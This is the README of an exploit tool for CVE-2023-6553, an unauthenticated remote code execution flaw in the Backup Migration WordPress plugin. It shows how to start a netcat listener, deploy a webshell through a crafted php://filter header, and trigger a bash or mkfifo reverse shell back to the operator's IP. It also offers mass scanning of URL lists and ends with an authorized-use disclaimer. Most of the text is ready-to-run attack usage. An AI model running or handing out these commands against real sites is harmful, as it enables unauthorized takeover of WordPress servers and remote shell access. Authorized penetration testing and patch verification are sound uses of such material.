# CVE-2023-6553 — The Backup Migration plugin for WordPress - Reverse Shell

An extended version of [Chocapikk's CVE-2023-6553 exploit](https://github.com/Chocapikk/CVE-2023-6553) that adds a **one-command reverse shell** mode on top of the original interactive webshell.

---

## Vulnerability

**CVE-2023-6553** — Unauthenticated Remote Code Execution in the **Backup Migration** WordPress plugin (versions ≤ 1.3.7).

The plugin exposes `backup-heart.php`, which reads a PHP filter chain from the `Content-Dir` HTTP header and passes it to `include()` without authentication or sanitization. This allows an unauthenticated attacker to execute arbitrary PHP code by injecting a crafted `php://filter` chain.

- **CVSS:** 9.8 (Critical)
- **Plugin:** Backup Migration ≤ 1.3.7
- **Reference:** [WPScan](https://wpscan.com/vulnerability/6a4d0af9-e1cd-4a69-a56c-3c009e207eca/)

---

## Credits

Original exploit by **[Chocapikk](https://github.com/Chocapikk/CVE-2023-6553)** — all core exploitation logic (filter chain generation, file write, interactive shell) is his work. This repository only extends it with a reverse shell trigger mode.

---

## Differences from the Original

| Feature | Original (Chocapikk) | This version |
|---|---|---|
| Interactive webshell | ✅ | ✅ (unchanged) |
| Reverse shell | ❌ | ✅ (`-r`) |
| Multi-URL scanning | ✅ | ✅ (unchanged) |
| New arguments | — | `-r`, `-l`, `-p`, `--shell` |

The only additions are:

1. **`trigger_reverse_shell()` method** — after the webshell is deployed (same process as the original), sends a single GET request with the reverse shell command as the `0` parameter, exactly as the interactive shell would.
2. **4 new argparse arguments** — to enable and configure the reverse shell mode.
3. **5 lines in `main()`** — swap `interactive_shell()` for `trigger_reverse_shell()` when `-r` is present.

Everything else — vulnerability check, file write loop, copy/unlink, interactive mode, multi-URL scanning — is untouched from the original.

---

## Requirements

```bash
pip install requests rich alive-progress prompt-toolkit php-filter-chain
```

---

## Usage

### Reverse shell mode (new)

```bash
# Start your listener first
rlwrap nc -lvnp 4444

# Run the exploit
python3 exploit.py -u http://TARGET/blog -r -l YOUR_IP -p 4444
```

If `bash /dev/tcp` is unavailable on the target, use `mkfifo` (relies on `nc` instead):

```bash
python3 exploit.py -u http://TARGET/blog -r -l YOUR_IP -p 4444 --shell mkfifo
```

### Interactive webshell mode (original behavior)

```bash
python3 exploit.py -u http://TARGET/blog
```

### Vulnerability check only

```bash
python3 exploit.py -u http://TARGET/blog -c
```

### Scan a list of URLs

```bash
python3 exploit.py -f urls.txt -t 10 -o vulnerable.txt
```

### All arguments

```
-u / --url      Target base URL (e.g. http://target/blog)
-r / --revshell Enable reverse shell mode
-l / --lhost    Your IP to receive the shell (required with -r)
-p / --lport    Your listener port (default: 4444)
     --shell    Shell type: bash (default) or mkfifo
-c / --check    Check vulnerability only, do not deploy shell
-f / --file     File with list of URLs to scan
-t / --threads  Threads for multi-URL scan (default: 5)
-o / --output   Output file for scan results
```

---

## How It Works

```
1. POST /wp-content/plugins/backup-backup/includes/backup-heart.php
   Content-Dir: php://filter/...<encoded PHP>
   → Writes webshell char by char to a temp file
   → Copies temp file to <random>.php

2. GET /wp-content/plugins/backup-backup/includes/<random>.php?0=<cmd>
   → Executes command via backtick operator
   → Interactive mode: loops reading commands from stdin
   → Reverse shell mode: sends bash/mkfifo one-liner, connects to listener

3. Cleanup: unlink(<random>.php)
```

---

## Disclaimer

This tool is intended for authorized penetration testing and security research only. Do not use against systems you do not have explicit permission to test.
